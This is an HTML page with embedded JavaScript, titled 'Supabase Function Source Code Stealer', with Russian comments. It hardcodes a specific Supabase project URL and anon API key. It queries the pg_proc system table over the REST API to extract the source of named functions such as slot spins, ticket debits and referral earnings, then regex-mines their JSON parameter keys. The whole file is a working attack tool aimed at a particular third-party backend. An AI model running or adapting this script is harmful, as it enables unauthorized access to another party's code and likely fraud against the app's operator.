<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Supabase Function Source Code Stealer</title>
    <style>
        body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 20px; }
        button { background: #238636; color: white; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; width: 100%; margin-bottom: 20px;}
        .log { border: 1px solid #30363d; padding: 10px; background: #161b22; white-space: pre-wrap; font-size: 12px; }
        .success { color: #3fb950; }
        .fail { color: #f85149; }
        .sql-code { color: #e0e0e0; background: #222; padding: 10px; border: 1px solid #555; margin-top: 5px; }
    </style>
</head>
<body>

    <h1>🕵️ Попытка кражи исходного кода функций</h1>
    <p>Если сработает, мы увидим, какие поля JSON они парсят.</p>
    
    <button onclick="stealSource()">НАЧАТЬ СКАНИРОВАНИЕ</button>
    <div id="console" class="log">Жду запуска...</div>

<script>
    const CONFIG = {
        url: 'https://djpcftyqkwucbksknsdu.supabase.co',
        key: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRqcGNmdHlxa3d1Y2Jrc2tuc2R1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ2NzE4ODIsImV4cCI6MjA2MDI0Nzg4Mn0.SNI196TucjsepnXIkZDgGwRv7J5chYE9KN6gBx5BszA'
    };

    // Список функций, которые нас интересуют
    const TARGETS = [
        'increment_referral_earnings',
        'rpc_slot_spin',
        'debit_tickets_if_enough',
        'recalc_all_referrals',
        'rpc_slot_claim'
    ];

    const LOG = document.getElementById('console');

    function log(msg, type = '') {
        LOG.innerHTML += `<div class="${type}">${msg}</div>`;
    }

    async function stealSource() {
        LOG.innerHTML = "🚀 Пробуем получить доступ к pg_proc...\n\n";
        
        // Мы запрашиваем имя функции (proname) и её исходный код (prosrc)
        // prosrc - это поле, где лежит текст SQL функции
        const endpoint = `${CONFIG.url}/rest/v1/pg_proc?select=proname,prosrc,proargnames&proname=in.(${TARGETS.join(',')})`;

        try {
            const res = await fetch(endpoint, {
                method: 'GET',
                headers: {
                    'apikey': CONFIG.key,
                    'Authorization': `Bearer ${CONFIG.key}`
                }
            });

            if (res.ok) {
                const data = await res.json();
                if (data.length > 0) {
                    log(`✅ УСПЕХ! Системная таблица открыта! Найдено функций: ${data.length}`, 'success');
                    
                    data.forEach(fn => {
                        log(`\n----------------------------------------`);
                        log(`📜 Функция: <b>${fn.proname}</b>`);
                        log(`🔧 Аргументы: ${JSON.stringify(fn.proargnames)}`);
                        log(`\n💻 ИСХОДНЫЙ КОД:\n<div class="sql-code">${escapeHtml(fn.prosrc)}</div>`);
                        
                        // Пытаемся найти JSON ключи в коде
                        const keys = (fn.prosrc.match(/['"]\w+['"]\s*:/g) || [])
                                    .concat(fn.prosrc.match(/->>?\s*['"](\w+)['"]/g) || []);
                        
                        if (keys.length > 0) {
                            log(`🔎 Найденные JSON ключи (параметры): <span style="color:yellow">${keys.join(', ')}</span>`);
                        }
                    });
                } else {
                    log(`⚠️ Доступ к pg_proc есть, но функции не найдены (возможно, они в другой схеме или скрыты RLS).`, 'fail');
                }
            } else {
                log(`🔒 Провал. Системные таблицы закрыты. Код ошибки: ${res.status} (${res.statusText})`, 'fail');
                if (res.status === 404) log("Таблица pg_proc не найдена в API (это стандартная настройка безопасности).");
            }

        } catch (e) {
            log(`Ошибка сети: ${e.message}`, 'fail');
        }
    }

    function escapeHtml(text) {
        if (!text) return "Code hidden or empty";
        return text
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }
</script>

</body>
</html>
